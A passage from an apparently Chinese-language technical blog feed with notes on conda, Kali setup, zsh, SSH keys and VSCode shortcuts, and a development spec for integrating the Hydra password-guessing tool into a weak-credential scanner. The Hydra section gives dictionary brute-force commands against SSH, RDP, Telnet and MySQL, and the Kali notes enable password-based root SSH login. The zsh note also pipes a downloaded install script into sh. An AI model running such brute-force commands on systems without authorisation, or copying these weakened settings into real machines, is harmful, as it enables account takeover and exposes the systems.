pandas</code></pre></div></li></ul><blockquote><p>注：默认情况下，新创建的环境将会被保存在<code>/Users/&lt;user_name&gt;/anaconda3/envs</code>目录下，其中，<code>&lt;user_name&gt;</code>为当前用户的用户名。</p></blockquote><h4 id="使用环境"><a href="#使用环境" class="headerlink" title="使用环境"></a>使用环境</h4><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 激活环境conda activate &lt;env_name&gt;source activate &lt;env_name&gt;# 示例conda activate python2_testsource activate python2_test# 退出环境conda deactivatesource deactivate# 显示已创建环境conda env listconda info -econda info --envs</code></pre></div><h4 id="复制环境"><a href="#复制环境" class="headerlink" title="复制环境"></a>复制环境</h4><div class="code-wrapper"><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp">conda create --name &lt;new_env_name&gt; --clone &lt;copied_env_name&gt;</code></pre></div><h4 id="删除环境"><a href="#删除环境" class="headerlink" title="删除环境"></a>删除环境</h4><div class="code-wrapper"><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp">conda remove --name &lt;env_name&gt; --all</code></pre></div><h3 id="3-管理包"><a href="#3-管理包" class="headerlink" title="3. 管理包"></a>3. 管理包</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">### 查找包 #### 精确查找conda search --full-name &lt;package_full_name&gt;# 模糊查找conda search &lt;text&gt;# 获取当前环境包信息conda list</code></pre></div><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">### 安装包 #### 在指定环境中安装包conda install --name &lt;env_name&gt; &lt;package_name&gt;# 在当前环境中安装包conda install &lt;package_name&gt;</code></pre></div><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">### 卸载包 #### 在指定环境中卸载包conda remove --name &lt;env_name&gt; &lt;package_name&gt;# 在当前环境中卸载包conda remove &lt;package_name&gt;</code></pre></div><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">### 更新包 ### conda update --allconda upgrade --allconda update &lt;package_name&gt;conda upgrade &lt;package_name&gt;# 更新多个指定包，空格隔开即可conda update pandas numpy matplotlib</code></pre></div><hr><blockquote><p>参考：</p><p><a href="https://www.jianshu.com/p/62f155eb6ac5">https://www.jianshu.com/p/62f155eb6ac5</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>conda</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kali安装相关设置</title>
    <link href="/posts/c77e9c76/"/>
    <url>/posts/c77e9c76/</url>
    
    <content type="html"><![CDATA[<blockquote><p>Kali安装后进行一些常规设置，以此记录。</p></blockquote><h2 id="设置root用户"><a href="#设置root用户" class="headerlink" title="设置root用户"></a>设置root用户</h2><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo passwd</code></pre></div><h2 id="文件夹名"><a href="#文件夹名" class="headerlink" title="文件夹名"></a>文件夹名</h2><p>若安装系统时选择为中文安装，初始的用户文件夹将为中文用起来不方便。</p><p>先把系统语言改为英文，在终端中输入命令:  </p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">export LANG&#x3D;en_USxdg-user-dirs-gtk-update</code></pre></div><p>跳出对话框询问是否将目录转化为英文路径，同意并关闭。</p><p>再将系统语言改为中文，在终端中输入命令：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">export LANG&#x3D;zh_CN</code></pre></div><p>重启系统，下次进入系统，系统会提示是否把转化好的目录改回中文，选择不再提示，并取消修改。主目录的中文转英文就完成了。</p><h2 id="换源与更新"><a href="#换源与更新" class="headerlink" title="换源与更新"></a>换源与更新</h2><p>修改<code>/etc/apt/sources.list </code>，注释掉原来的源，写入新的源。</p><div class="code-wrapper"><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"># deb cdrom:[Ubuntu 16.04 LTS _Xenial Xerus_ - Release amd64 (20160420.1)]&#x2F; xenial main restricteddeb-src http:&#x2F;&#x2F;archive.ubuntu.com&#x2F;ubuntu xenial main restricted #Added by software-propertiesdeb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; xenial main restricteddeb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; xenial main restricted multiverse universe #Added by software-propertiesdeb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; xenial-updates main restricteddeb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; xenial-updates main restricted multiverse universe #Added by software-propertiesdeb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; xenial universedeb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; xenial-updates universedeb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; xenial multiversedeb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; xenial-updates multiversedeb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; xenial-backports main restricted universe multiversedeb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; xenial-backports main restricted universe multiverse #Added by software-propertiesdeb http:&#x2F;&#x2F;archive.canonical.com&#x2F;ubuntu xenial partnerdeb-src http:&#x2F;&#x2F;archive.canonical.com&#x2F;ubuntu xenial partnerdeb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; xenial-security main restricteddeb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; xenial-security main restricted multiverse universe #Added by software-propertiesdeb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; xenial-security universedeb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; xenial-security multiverse</code></pre></div><p>更新：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 根据源里面的metadata更新本地软件包信息，包括这个源有什么包, 每个包什么版本之类的apt-get update# 根据metadata更新本地软件，如果有依赖变化问题则不更新相应packageapt-get upgrade# 在更新新软件时会更新依赖apt-get dist-upgrade</code></pre></div><h2 id="Gnome"><a href="#Gnome" class="headerlink" title="Gnome"></a>Gnome</h2><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">apt-get install kali-desktop-gnome</code></pre></div><p>在中间选择<code>显示管理器</code>时，选择<code>gdm3</code>之后重启。</p><h3 id="gnome允许root登入"><a href="#gnome允许root登入" class="headerlink" title="gnome允许root登入"></a>gnome允许root登入</h3><p>将 <code>/etc/pam.d/gdm-password</code> 文件中的root登录检查注释掉即可。</p><div class="code-wrapper"><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"># auth required pam_succeed_if.so user !&#x3D; root quiet_success</code></pre></div><h2 id="输入法"><a href="#输入法" class="headerlink" title="输入法"></a>输入法</h2><p>安装输入法框架</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">apt-get install fcitx</code></pre></div><p>安装谷歌输入法</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">apt-get install fcitx-googlepinyin</code></pre></div><p>重启</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">reboot</code></pre></div><p>在fcitx配置中将Google拼音设置为首选项。</p><h2 id="设置SSH"><a href="#设置SSH" class="headerlink" title="设置SSH"></a>设置SSH</h2><p>将<code>/etc/ssh/sshd_config</code>中</p><div class="code-wrapper"><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"># PermitRootLogin prohibit-password···# PasswordAuthentication yes</code></pre></div><p>改为：</p><div class="code-wrapper"><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">PermitRootLogin yes···PasswordAuthentication yes</code></pre></div><p>启动服务并设为开机启动：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">service ssh restartupdate-rc.d ssh enable</code></pre></div><h2 id="美化"><a href="#美化" class="headerlink" title="美化"></a>美化</h2><p>在<code>优化</code>中，可以选择<a href="https://www.gnome-look.org/p/1013714">主题</a>和<a href="https://www.opendesktop.org/p/1305429/">图标</a>等。放于<code>/usr/share/themes</code>与<code>/usr/share/icons</code>文件夹下可直接使用。</p><hr><blockquote><p>参考：</p><p><a href="https://www.zhihu.com/question/64374670/answer/1354272784">https://www.zhihu.com/question/64374670/answer/1354272784</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>项目组</category>
      
      <category>Kali</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Ubuntu</tag>
      
      <tag>Kali</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ubuntu下zsh及Oh-My-Zsh设置</title>
    <link href="/posts/b6373879/"/>
    <url>/posts/b6373879/</url>
    
    <content type="html"><![CDATA[<blockquote><p>Z shell（Zsh）是一款可用作交互式登录的shell及脚本编写的命令解释器。内置于Ubuntu与OSX中，功能强大。</p><p>Oh My Zsh是一个开源的的框架，用于管理你的Zsh配置。有很多主题与扩展。</p></blockquote><h2 id="安装Zsh"><a href="#安装Zsh" class="headerlink" title="安装Zsh"></a>安装Zsh</h2><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 查看系统已有shellcat &#x2F;etc&#x2F;shells# 查看当前默认的 Shellecho $SHELL # 安装zsh（Ubuntu与OSX内置有，若无用apt安装）sudo apt install zsh# 将 Zsh 设置为默认 Shell（chsh-change shell）chsh -s &#x2F;bin&#x2F;zsh# 重启 Shell（reboot）。</code></pre></div><h2 id="安装-Oh-My-Zsh"><a href="#安装-Oh-My-Zsh" class="headerlink" title="安装 Oh My Zsh"></a>安装 Oh My Zsh</h2><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 安装Oh My Zshwget https:&#x2F;&#x2F;github.com&#x2F;robbyrussell&#x2F;oh-my-zsh&#x2F;raw&#x2F;master&#x2F;tools&#x2F;install.sh -O - | sh</code></pre></div><p>出现如下界面则安装成功。安装于默认<code>.oh-my-zsh</code>。</p><div class="code-wrapper"><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp">__                                     __     ____  &#x2F; &#x2F;_     ____ ___  __  __   ____  _____&#x2F; &#x2F;_   &#x2F; __ \&#x2F; __ \   &#x2F; __ &#96;__ \&#x2F; &#x2F; &#x2F; &#x2F;  &#x2F;_  &#x2F; &#x2F; ___&#x2F; __ \ &#x2F; &#x2F;_&#x2F; &#x2F; &#x2F; &#x2F; &#x2F;  &#x2F; &#x2F; &#x2F; &#x2F; &#x2F; &#x2F; &#x2F;_&#x2F; &#x2F;    &#x2F; &#x2F;_(__  ) &#x2F; &#x2F; &#x2F; \____&#x2F;_&#x2F; &#x2F;_&#x2F;  &#x2F;_&#x2F; &#x2F;_&#x2F; &#x2F;_&#x2F;\__, &#x2F;    &#x2F;___&#x2F;____&#x2F;_&#x2F; &#x2F;_&#x2F;                          &#x2F;____&#x2F;                       ....is now installed!Please look over the ~&#x2F;.zshrc file to select plugins, themes, and options.p.s. Follow us at https:&#x2F;&#x2F;twitter.com&#x2F;ohmyzsh.p.p.s. Get stickers and t-shirts at http:&#x2F;&#x2F;shop.planetargon.com.</code></pre></div><h2 id="Zsh配置"><a href="#Zsh配置" class="headerlink" title="Zsh配置"></a>Zsh配置</h2><h3 id="主题配置"><a href="#主题配置" class="headerlink" title="主题配置"></a>主题配置</h3><p><a href="https://github.com/ohmyzsh/ohmyzsh/wiki/themes">Oh My Zsh主题</a>较多，默认使用的是<em>robbyrussell</em>，<em>agnoster</em>也比较不错。内置主题位于<code>~/.oh-my-zsh/themes</code>中，其他的主题也可下载在此处，在配置文件中直接启用。主题文件可直接打开编辑，重新source配置文件即可生效。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 编辑配置文件修改主题vim ~&#x2F;.zshrc# 修改其中的内容ZSH_THEME&#x3D;&quot;agnoster&quot;</code></pre></div><p>使用<em>agnoster</em>主题出现乱码，可通过安装解决字体问题。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo apt-get install powerline fonts-powerline</code></pre></div><h3 id="插件配置"><a href="#插件配置" class="headerlink" title="插件配置"></a>插件配置</h3><p><a href="https://github.com/ohmyzsh/ohmyzsh/wiki/Plugins">Oh My Zsh插件</a>，内置很多插件位于<code>/.oh-my-zsh/plugins</code>。可在<code>~/.zshrc</code>中的<code>plugins</code>直接配置打开。</p><ul><li>z 是一个相当实用的 cd 命令增强脚本（记录你的cd使用习惯 通过z命令模糊匹配）</li></ul><blockquote><p>若未安装zsh，在源码仓库里可以看到，<strong>Z</strong> 其实也就是一个 <strong>.sh</strong> 脚本，所以不管你用的是什么Terminal，只用按以下步骤就能马上使用 <strong>Z</strong> 。</p><ol><li>将<a href="https://github.com/rupa/z/blob/master/z.sh">z.sh</a>下载到本地目录<code>git clone https://github.com/rupa/z.git</code></li><li>在根目录对应Terminal的文件（如果是默认的，一般是.bashrc）里加上<code>source</code>和z.sh所在目录</li><li>之后重启Terminal就可以开始用了</li></ol></blockquote><ul><li><p>extract是功能强大的解压插件，所有类型的文件解压一个命令x全搞定</p></li><li><p>同时额外装了几个常用的插件。可置于<code>~/.oh-my-zsh/custom/plugins</code>中便于管理。</p></li></ul><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 安装 zsh-autosuggestions# 命令行命令键入时的历史命令建议插件git clone https:&#x2F;&#x2F;github.com&#x2F;zsh-users&#x2F;zsh-autosuggestions $&#123;ZSH_CUSTOM:-~&#x2F;.oh-my-zsh&#x2F;custom&#125;&#x2F;plugins&#x2F;zsh-autosuggestions# 安装 zsh-syntax-highlighting# 命令行语法高亮插件git clone https:&#x2F;&#x2F;github.com&#x2F;zsh-users&#x2F;zsh-syntax-highlighting.git $&#123;ZSH_CUSTOM:-~&#x2F;.oh-my-zsh&#x2F;custom&#125;&#x2F;plugins&#x2F;zsh-syntax-highlightingecho &quot;source $&#123;(q-)PWD&#125;&#x2F;zsh-syntax-highlighting&#x2F;zsh-syntax-highlighting.zsh&quot; &gt;&gt; $&#123;ZDOTDIR:-$HOME&#125;&#x2F;.zshrc</code></pre></div><p>修改配置文件<code>vim ~/.zshrc</code>。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 最好把zsh-syntax-highlighting放在最后source &#x2F;opt&#x2F;z&#x2F;z.shsource ~&#x2F;.oh-my-zsh&#x2F;custom&#x2F;plugins&#x2F;zsh-syntax-highlighting&#x2F;zsh-syntax-highlighting.zshplugins&#x3D;(  git extract zsh-autosuggestions z zsh-syntax-highlighting)</code></pre></div><hr><blockquote><p>参考：</p><p><a href="https://juejin.im/post/6844903620333289486">https://juejin.im/post/6844903620333289486</a></p><p><a href="https://www.jianshu.com/p/fa82d932888b">https://www.jianshu.com/p/fa82d932888b</a></p><p><a href="https://linuxtoy.org/archives/z.html">https://linuxtoy.org/archives/z.html</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>Shell</tag>
      
      <tag>Zsh</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux SSH免密认证密钥配置及VSCode-SSH配置</title>
    <link href="/posts/28830640/"/>
    <url>/posts/28830640/</url>
    
    <content type="html"><![CDATA[<blockquote><p>记录一下Linux的SSH免密配置，以及在VSCode上配置SSH以映射文件，编辑远端文档。</p></blockquote><h2 id="SSH公私钥配置"><a href="#SSH公私钥配置" class="headerlink" title="SSH公私钥配置"></a>SSH公私钥配置</h2><blockquote><p>SSH使用方便且安全，公私钥均有本地生成，公钥存放至服务器端即可</p></blockquote><h3 id="生成密钥ssh-keygen"><a href="#生成密钥ssh-keygen" class="headerlink" title="生成密钥ssh-keygen"></a>生成密钥<code>ssh-keygen</code></h3><p>样例：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-keygen -t rsa -f aliyun_ssh -C &quot;备注&quot;</code></pre></div><table><thead><tr><th>参数</th><th align="left">使用</th></tr></thead><tbody><tr><td>-f</td><td align="left">生成文件名</td></tr><tr><td>-t</td><td align="left">采用rsa加密方式,t=type</td></tr><tr><td>-b</td><td align="left">采用长度1024bit的密钥对,b=bits,最长4096</td></tr><tr><td>-C</td><td align="left">备注</td></tr></tbody></table><p>如果该命令是在<code>~/.ssh</code>目录下执行，执行后~/.ssh目录对多出<code>aliyun_ssh</code>和<code>aliyun_ssh.pub</code>两个文件。</p><p>有pub后缀的文件为公钥，没有pub后缀的文件为私钥。</p><h3 id="配置公钥ssh-copy-id"><a href="#配置公钥ssh-copy-id" class="headerlink" title="配置公钥ssh-copy-id"></a>配置公钥<code>ssh-copy-id</code></h3><p>样例：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-copy-id -i ~&#x2F;.ssh&#x2F;aliyun_ssh.pub root@2.2.2.2</code></pre></div><p><code>-i</code> (identity_file认证文件)，其实是通过ssh将公钥写入远程服务器的<code>~/ .ssh/authorized_key</code>中（向后添加）。通过文本的复制效果相同。</p><blockquote><p>注：<strong>需要服务器端的~/ .ssh/authorized_key文件具有600权限！</strong></p></blockquote><h3 id="本地SSH配置"><a href="#本地SSH配置" class="headerlink" title="本地SSH配置"></a>本地SSH配置</h3><p>配置格式简单如下：</p><div class="code-wrapper"><pre class="line-numbers language-json" data-language="json"><code class="language-json">Host 10.211.1.1  HostName 10.211.1.1  User rootHost aliyun-2.2.2.2  HostName 2.2.2.2  User root  IdentityFile ~&#x2F;.ssh&#x2F;aliyun_ssh</code></pre></div><p>其中<strong>Host</strong>是自己备注的名字，<strong>HostName</strong>即服务器IP，<strong>User</strong>为登录用户。</p><p>如果使用SSH公私钥登录则需要配置<strong>IdentityFile</strong>指向本地存放的私钥。</p><p>登录时即可备注的名字快速登录(支持tab补全)</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh aliyun-2.2.2.2</code></pre></div><h2 id="配置VSCode-Remote-SSH"><a href="#配置VSCode-Remote-SSH" class="headerlink" title="配置VSCode Remote - SSH"></a>配置VSCode Remote - SSH</h2><p>直接在VSCode安装Remote - SSH扩展即可。</p><p><img src="/posts/28830640/remotessh.png"></p><p>安装完后会在侧边栏和左下角出现相应的扩展栏。</p><p><img src="/posts/28830640/sidebar.png"></p><p>可根据系统ssh-config进行连接，即可快速在本地编辑远端文本。</p><h2 id="VSCode快捷键"><a href="#VSCode快捷键" class="headerlink" title="VSCode快捷键"></a>VSCode快捷键</h2><blockquote><p>最后记录一些常用的快捷键</p></blockquote><h3 id="全局"><a href="#全局" class="headerlink" title="全局"></a>全局</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Command + Shift + P &#x2F; F1 显示命令面板Command + P 快速打开Command + Shift + N 打开新窗口Command + W 关闭窗口</code></pre></div><h3 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Command + X 剪切（未选中文本的情况下，剪切光标所在行）Command + C 复制（未选中文本的情况下，复制光标所在行）Option + Up 向上移动行Option + Down 向下移动行Option + Shift + Up 向上复制行Option + Shift + Down 向下复制行Command + Shift + K 删除行Command + Enter 下一行插入Command + Shift + Enter 上一行插入Command + Shift + \ 跳转到匹配的括号Command + [ 减少缩进Command + ] 增加缩进Home 跳转至行首End 跳转到行尾Command + Up 跳转至文件开头Command + Down 跳转至文件结尾Ctrl + PgUp 按行向上滚动Ctrl + PgDown 按行向下滚动Command + PgUp 按屏向上滚动Command + PgDown 按屏向下滚动Command + Shift + [ 折叠代码块Command + Shift + ] 展开代码块Command + K Command + [ 折叠全部子代码块Command + K Command + ] 展开全部子代码块Command + K Command + 0 折叠全部代码块Command + K Command + J 展开全部代码块Command + K Command + C 添加行注释Command + K Command + U 移除行注释Command + &#x2F; 添加、移除行注释Option + Shift + A 添加、移除块注释Option + Z 自动换行、取消自动换行</code></pre></div><h3 id="多光标与选择"><a href="#多光标与选择" class="headerlink" title="多光标与选择"></a>多光标与选择</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Option + 点击 插入多个光标Command + Option + Up 向上插入光标Command + Option + Down 向下插入光标Command + U 撤销上一个光标操作Option + Shift + I 在所选行的行尾插入光标Command + I 选中当前行Command + Shift + L 选中所有与当前选中内容相同部分Command + F2 选中所有与当前选中单词相同的单词Command + Ctrl + Shift + Left 折叠选中Command + Ctrl + Shift + Right 展开选中Alt + Shift + 拖动鼠标 选中代码块Command + Shift + Option + Up 列选择 向上Command + Shift + Option + Down 列选择 向下Command + Shift + Option + Left 列选择 向左Command + Shift + Option + Right 列选择 向右Command + Shift + Option + PgUp 列选择 向上翻页Command + Shift + Option + PgDown 列选择 向下翻页</code></pre></div><h3 id="查找替换"><a href="#查找替换" class="headerlink" title="查找替换"></a>查找替换</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Command + F 查找Command + Option + F 替换Command + G 查找下一个Command + Shift + G 查找上一个Option + Enter 选中所有匹配项Command + D 向下选中相同内容Command + K Command + D 移除前一个向下选中相同内容</code></pre></div><h3 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Ctrl + Space 打开建议Command + Shift + Space 参数提示Tab Emmet插件缩写补全Option + Shift + F 格式化Command + K Command + F 格式化选中内容F12 跳转到声明位置Option + F12 查看具体声明内容Command + K F12 分屏查看具体声明内容Command + . 快速修复Shift + F12 显示引用F2 重命名符号Command + Shift + . 替换为上一个值Command + Shift + , 替换为下一个值Command + K Command + X 删除行尾多余空格Command + K M 更改文件语言</code></pre></div><h3 id="导航"><a href="#导航" class="headerlink" title="导航"></a>导航</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Command + T 显示所有符号Ctrl + G 跳转至某行Command + P 跳转到某个文件Command + Shift + O 跳转到某个符号Command + Shift + M 打开问题面板F8 下一个错误或警告位置Shift + F8 上一个错误或警告位置Ctrl + Shift + Tab 编辑器历史记录Ctrl + - 后退Ctrl + Shift + - 前进Ctrl + Shift + M Tab 切换焦点</code></pre></div><h3 id="编辑器管理"><a href="#编辑器管理" class="headerlink" title="编辑器管理"></a>编辑器管理</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Command + W 关闭编辑器Command + K F 关闭文件夹Command + \ 编辑器分屏Command + 1 切换到第一分组Command + 2 切换到第二分组Command + 3 切换到第三分组Command + K Command + Left 切换到上一分组Command + K Command + Right 切换到下一分组Command + K Command + Shift + Left 左移编辑器Command + K Command + Shift + Right 右移编辑器Command + K Left 激活左侧编辑组Command + K Right 激活右侧编辑组</code></pre></div><h3 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Command + N 新建文件Command + O 打开文件Command + S 保存文件Command + Shift + S 另存为Command + Option + S 全部保存Command + W 关闭Command + K Command + W 全部关闭Command + Shift + T 重新打开被关闭的编辑器Command + K Enter 保持打开Ctrl + Tab 打开下一个Ctrl + Shift + Tab 打开上一个Command + K P 复制当前文件路径Command + K R 在资源管理器中查看当前文件Command + K O 新窗口打开当前文件</code></pre></div><h3 id="显示"><a href="#显示" class="headerlink" title="显示"></a>显示</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Command + Ctrl + F 全屏、退出全屏Command + Option + 1 切换编辑器分屏方式（横、竖）Command + + 放大Command + - 缩小Command + B 显示、隐藏侧边栏Command + Shift + E 显示资源管理器 或 切换焦点Command + Shift + F 显示搜索框Ctrl + Shift + G 显示Git面板Command + Shift + D 显示调试面板Command + Shift + X 显示插件面板Command + Shift + H 全局搜索替换Command + Shift + J 显示、隐藏高级搜索Command + Shift + C 打开新终端Command + Shift + U 显示输出面板Command + Shift + V Markdown预览窗口Command + K V 分屏显示 Markdown预览窗口</code></pre></div><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">F9 设置 或 取消断点F5 开始 或 继续F11 进入Shift + F11 跳出F10 跳过Command + K Command + I 显示悬停信息</code></pre></div><h3 id="集成终端"><a href="#集成终端" class="headerlink" title="集成终端"></a>集成终端</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Ctrl + &#96; 显示终端Ctrl + Shift + &#96; 新建终端Command + Up 向上滚动Command + Down 向下滚动PgUp 向上翻页PgDown 向下翻页Command + Home 滚动到顶部Command + End 滚动到底部</code></pre></div><hr><blockquote><p>参考：</p><p><a href="https://www.jianshu.com/p/dd053c18e5ee">https://www.jianshu.com/p/dd053c18e5ee</a></p><p><a href="https://segmentfault.com/a/1190000012811886">https://segmentfault.com/a/1190000012811886</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>SSH</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hydra开发说明</title>
    <link href="/posts/34a2c706/"/>
    <url>/posts/34a2c706/</url>
    
    <content type="html"><![CDATA[<blockquote><p>hydra工具集成进入扫描系统，与WEB开发端结合，通过开发说明明确输入输出格式与业务逻辑。</p></blockquote><h3 id="一、-输入格式"><a href="#一、-输入格式" class="headerlink" title="一、 输入格式"></a>一、 输入格式</h3><ol><li>命令行范式</li></ol><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra [some command line options] TARGET PROTOCOL </code></pre></div><ol start="2"><li>输入内容</li></ol><p>包括<strong>协议选择</strong>，<strong>IP地址与端口指定</strong></p><ul><li>协议（必选项），具有<code>RDP</code>、<code>MYSQL</code>、<code>SSH</code>、<code>TELNET</code>选项</li><li>IP地址（必选项）与端口（可选项），具有输入IP与上传IP地址文件两种模式</li></ul><blockquote><ol><li><p>输入IP模式：支持<code>IP[:port]</code>与<code>CIDR</code>模式(192.168.0.0/24)</p></li><li><p>上传IP地址文件模式：文件一行表示一个地址，格式应为<code>IP[:port]</code>，例：</p></li></ol><p>foo.bar.com<br>target.com:21<br>unusual.port.com:2121<br>default.used.here.com<br>127.0.0.1<br>127.0.0.1:2121</p></blockquote><p><em>（注：后期考虑将其他模块扫描得到的存活主机作为本模块地址参数）</em></p><ol start="3"><li>其他已选相关参数</li></ol><ul><li>-L：指定用户名字典（根据协议选定内置字典）</li><li>-P：指定密码字典（根据协议选定内置字典）</li></ul><p><em>（注：内置字典可置于服务器静态文件中，为行数较多的txt文件）</em></p><ul><li>-e ns：空密码与账密相同探测</li><li>-o：指定输出文件</li><li>-b：指定输出格式（本次选用json）</li></ul><ol start="4"><li>输入示例</li></ol><ul><li>扫描文件地址中的SSH弱口令</li></ul><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra -L ssh_login.txt -P ssh_passwd.txt -e ns -o result.json -b json -M IP_addr.txt ssh</code></pre></div><ul><li>扫描指定IP的RDP弱口令</li></ul><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra -L rdp_login.txt -P rdp_passwd.txt -e ns -o result.json -b json 127.0.0.1 rdp</code></pre></div><ul><li>扫描文件地址的TELNET弱口令</li></ul><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra -L telnet_login.txt -P telnet_passwd.txt -e ns -o result.json -b json -M IP_addr.txt telnet </code></pre></div><ul><li>扫描指定IP的MYSQL弱口令</li></ul><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra -L mysql_login.txt -P mysql_passwd.txt -e ns -o result.json -b json 127.0.0.1 mysql</code></pre></div><h3 id="二、输出格式"><a href="#二、输出格式" class="headerlink" title="二、输出格式"></a>二、输出格式</h3><blockquote><p>采用本地缓存json格式，输出文件由-o选项的参数指定。</p></blockquote><p>SSH测试成功样例，扫描记录信息记录在上，结果存于<code>results</code>中。</p><div class="code-wrapper"><pre class="line-numbers language-json" data-language="json"><code class="language-json">&#123; &quot;generator&quot;: &#123;&quot;software&quot;: &quot;Hydra&quot;, &quot;version&quot;: &quot;v9.1&quot;, &quot;built&quot;: &quot;2020-09-29 15:44:28&quot;,&quot;server&quot;: &quot;127.0.0.1&quot;, &quot;service&quot;: &quot;ssh&quot;, &quot;jsonoutputversion&quot;: &quot;1.00&quot;,&quot;commandline&quot;: &quot;hydra -l root -p root1 -e ns -o b.json -b json 127.0.0.1 ssh&quot;&#125;,&quot;results&quot;: [&#123;&quot;port&quot;: 22, &quot;service&quot;: &quot;ssh&quot;, &quot;host&quot;: &quot;127.0.0.1&quot;, &quot;login&quot;: &quot;root&quot;, &quot;password&quot;: &quot;root&quot;&#125;],&quot;success&quot;: true,&quot;errormessages&quot;: [  ],&quot;quantityfound&quot;: 1   &#125;</code></pre></div><p>为扫描出弱口令则<code>results</code>为空。</p><div class="code-wrapper"><pre class="line-numbers language-json" data-language="json"><code class="language-json">&#123; 